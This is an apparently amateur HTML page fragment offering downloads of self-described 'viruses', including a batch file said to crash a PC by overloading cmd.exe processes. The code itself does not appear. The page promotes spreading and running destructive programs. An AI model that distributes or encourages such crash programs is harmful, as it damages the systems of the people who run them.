    <h1>Viruses download</h1>
    <a href="Viruses\specials\forever_crash" class="download-link" download>download forever_crash v.1</a>
    <p>This Virus is the most dangerous one yet (ninth june 2025) instructions are included in the download I recommend you read them before running.</p>
    <a href="Viruses\specials\Process_Overload" class="download-link" download>Download Process Overload v.1</a>
    <p>This virus is slighy less damaging then forever_crash as this one only crashes pc once only on opening the batch file by over loading processes of cmd.exe the instructions and info about the file is included with the virus download</p>
    <a href="Viruses\stage 1\Mod_Restart.vbs" class="download-link" download>Download basic shut down option</a>
    <p>This is not a virus at all it just gives the user an option to shut down or not I don't know why I put it here.</p>
